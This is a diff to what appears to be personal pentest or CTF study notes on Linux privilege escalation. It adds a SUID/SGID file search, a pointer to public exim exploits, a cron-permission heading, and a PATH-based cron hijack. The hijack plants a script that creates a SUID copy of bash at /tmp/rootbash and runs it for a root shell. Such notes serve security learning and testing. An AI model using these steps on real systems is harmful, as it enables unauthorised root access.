@@ -27,6 +27,10 @@ Check SUID(Set owner User ID upon execution), which will provide special type of
 $find / -user root -perm /4000 2>/dev/null	
 $find / -perm -u=s -type f 2>/dev/null
 $find / -user root -perm -4000 -print 2>/dev/null
+$find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+
+Look for a known exploit for this version of exim. Exploit-DB, Google, and GitHub. Might be a script.
+
 
 ---------------------------
 
@@ -51,6 +55,9 @@ Check if /etc/passwd file is world-writable (contains information about user acc
 ---------------------------
 
 Check crontab
+
+Cron Jobs file permission
+
 > cat /etc/crontab
 
 Locate the job
@@ -68,4 +75,19 @@ Start netcat listener
 
 ---------------------------
 
+PATH environment variable
 
+if the PATH variable starts with /home/user 
+you could create <job> named file to /home/user
+
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+
+make it executable
+>chmod +x /home/user/<job>.sh
+
+>/tmp/rootbash -p
+
+---------------------------
